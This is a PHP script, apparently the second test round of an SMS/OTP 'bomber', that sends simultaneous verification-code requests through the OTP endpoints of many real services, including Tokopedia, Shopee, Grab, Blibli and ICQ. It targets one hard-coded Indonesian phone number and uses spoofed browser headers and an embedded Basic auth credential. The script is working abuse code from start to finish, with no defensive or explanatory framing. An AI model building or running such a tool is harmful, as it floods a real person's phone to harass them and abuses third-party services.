<?php
// Ronde 2: lihat body LENGKAP + varian header/payload buat endpoint yang balas JSON error
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$D = trim((string) @file_get_contents('/home/runner/bom/.device-id'));
$P = '6283822461998'; $L = '083822461998'; $N = '83822461998';

$REQS = [
  ['redbus-A (terbukti)', 'GET', 'https://m.redbus.id/api/getOtp?number=' . $N . '&cc=62&whatsAppOpted=True', [], '', true],
  ['cairin-B', 'POST', 'https://app.cairin.id/v1/app/sms/sendCaptcha', ['Content-Type: application/x-www-form-urlencoded'],
   'type=registry&phone=' . $P . '&userImei=&haveImageCode=0&fileName=&imageCode=', '', true],
  ['cairin-C', 'POST', 'https://app.cairin.id/v1/app/sms/sendCaptcha', ['Content-Type: application/json'],
   '{"type":"registry","phone":"' . $P . '","haveImageCode":"0","imageCode":"","userImei":"","fileName":""}', '', true],
  ['ktbs-B', 'GET', 'https://core.ktbs.io/v2/user/registration/otp/' . $N,
   ['Accept: application/json', 'x-app-version: 4.4.0', 'platform: android', 'Referer: https://ktbs.io/'], '', true],
  ['mapclub2-B', 'POST', 'https://beryllium.mapclub.com/api/member/registration/sms/otp',
   ['Content-Type: application/json', 'Accept: application/json, text/plain, */*', 'Origin: https://www.mapclub.com', 'Referer: https://www.mapclub.com/'],
   '{"account":"' . $L . '","country_code":"62","type":"register"}', '', true],
  ['gokwik-B', 'POST', 'https://gkx.gokwik.co/v4/auth/otp/login/trigger',
   ['Content-Type: application/json', 'Accept: application/json', 'Origin: https://pdp.gokwik.co', 'Referer: https://pdp.gokwik.co/'],
   '{"mobile":"' . $N . '","dialCode":"+62","channel":"SMS"}', '', true],
  ['icq-B', 'POST', 'https://u.icq.net/api/v14/rapi/auth/sendCode',
   ['Accept: */*', 'Content-Type: application/json', 'Origin: http://web.icq.com', 'Referer: http://web.icq.com/'],
   '{"reqId":"10001-1593781791","params":{"phone":"+62' . $N . '","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}', '', true],
  ['icq-C', 'POST', 'https://u.icq.net/api/v17/rapi/auth/sendCode',
   ['Accept: */*', 'Content-Type: application/json', 'Origin: http://web.icq.com', 'Referer: http://web.icq.com/'],
   '{"reqId":"10002-1593781791","params":{"phone":"+62' . $N . '","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}', '', true],
  ['grabid-B', 'POST', 'https://api.grab.com/grabid/v1/phone/otp',
   ['Content-Type: application/x-www-form-urlencoded', 'x-client-platform: ANDROID', 'x-client-version: 6.2.0'],
   'method=SMS&countryCode=ID&phoneNumber=+' . $P . '&templateID=pax_goid_android_prod', '', true],
  ['klikwa-B', 'POST', 'https://api.klikwa.net/v1/number/sendotp',
   ['Authorization: Basic QjMzOkZSMzM=', 'Content-Type: application/json', 'Accept: application/json'],
   '{"number": "+62' . $N . '", "isActive": true}', '', true],
  ['matahari-B', 'POST', 'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
   ['Content-Type: application/json', 'Accept: */*', 'X-Requested-With: XMLHttpRequest', 'Origin: https://www.matahari.com', 'Referer: https://www.matahari.com/customer/account/create/'],
   '{"otp_request":{"mobile_number":"' . $N . '","mobile_country_code":"+62"}}', '', true],
  ['tokped-B', 'POST', 'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
   ['Content-Type: application/x-www-form-urlencoded; charset=UTF-8', 'Accept: application/json, text/javascript, */*; q=0.01', 'X-Requested-With: XMLHttpRequest', 'Origin: https://accounts.tokopedia.com', 'Referer: https://accounts.tokopedia.com/otp/c/page?otp_type=116'],
   'otp_type=116&msisdn=+' . $P . '&ld=&email=&original_param=&user_id=&signature=&number_otp_digit=6', '', true],
  ['blibli-B', 'POST', 'https://api.blibli.com/identity/public/authentication/login/otp',
   ['Content-Type: application/json', 'Accept: application/json', 'Origin: https://www.blibli.com', 'Referer: https://www.blibli.com/'],
   '{"phone":{"code":"+62","number":"' . $N . '"},"channel":"SMS","purpose":"SIGN_UP"}', '', true],
  ['shopee-B', 'POST', 'https://shopee.co.id/api/v4/otp/send_vcode',
   ['Content-Type: application/json', 'Accept: application/json', 'x-api-source: rweb', 'x-shopee-language: id', 'X-Requested-With: XMLHttpRequest', 'Origin: https://shopee.co.id', 'Referer: https://shopee.co.id/buyer/login/otp'],
   '{"phone":' . $P . ',"force_channel":false,"operation":7,"channel":2,"supported_channels":[1,2,3]}', '', true],
];

$mh = curl_multi_init();
$cs = [];
foreach ($REQS as $i => $r) {
  $ch = curl_init();
  $hdrs = $r[3]; $hdrs[] = 'User-Agent: ' . $UA; $hdrs[] = 'Accept-Language: id';
  curl_setopt_array($ch, [
    CURLOPT_URL => $r[2], CURLOPT_HTTPHEADER => $hdrs, CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 8, CURLOPT_TIMEOUT => 25,
    CURLOPT_FOLLOWLOCATION => (bool) $r[6], CURLOPT_CUSTOMREQUEST => $r[1],
  ]);
  if ($r[1] !== 'GET') { curl_setopt($ch, CURLOPT_POSTFIELDS, $r[4]); }
  curl_multi_add_handle($mh, $ch);
  $cs[$i] = $ch;
}
$running = null; $errs = [];
do {
  curl_multi_exec($mh, $running);
  while (($info = curl_multi_info_read($mh)) !== false) {
    $idx = array_search($info['handle'], $cs, true);
    if ($info['result'] !== CURLE_OK) { $errs[$idx] = curl_strerror($info['result']); }
  }
  curl_multi_select($mh, 1.0);
} while ($running > 0);

foreach ($REQS as $i => $r) {
  $ch = $cs[$i];
  $body = (string) curl_multi_getcontent($ch);
  $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  echo "\n### " . $r[0] . "  [HTTP " . ($code ?: '000') . "]\n";
  if (isset($errs[$i])) { echo "GAGAL: " . $errs[$i] . "\n"; }
  else {
    $flat = trim(preg_replace('/\s+/', ' ', $body));
    echo (strlen($flat) > 380 ? substr($flat, 0, 380) . ' ...[potong]' : ($flat ?: '(body kosong)')) . "\n";
  }
  curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);
echo "\n";
